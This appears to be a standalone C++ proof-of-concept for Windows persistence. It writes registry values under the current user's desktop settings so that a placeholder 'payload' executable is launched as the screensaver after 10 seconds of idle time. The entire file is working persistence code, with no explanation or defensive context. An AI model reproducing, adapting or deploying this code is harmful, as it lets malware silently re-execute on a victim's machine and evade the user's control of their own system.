// Author: Nemuel Wainaina

#include <iostream>
#include <windows.h>

int main() {
    HKEY hKey = NULL;
    LONG result;
    const wchar_t* status = L"1";
    const wchar_t* timeout = L"10";
    const wchar_t* payload = L"Path\\To\\Your\\Payload.exe";

    result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"ScreenSaveActive", 0, REG_SZ, reinterpret_cast<const BYTE*>(status), (wcslen(status)+1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"ScreenSaveTimeOut", 0, REG_SZ, reinterpret_cast<const BYTE*>(timeout), (wcslen(timeout)+1) * sizeof(wchar_t));
        RegSetValueExW(hKey, L"SCRNSAVE.EXE", 0, REG_SZ, reinterpret_cast<const BYTE*>(payload), (wcslen(payload)+1) * sizeof(wchar_t));
    }
    RegCloseKey(hKey);

    return 0;
}
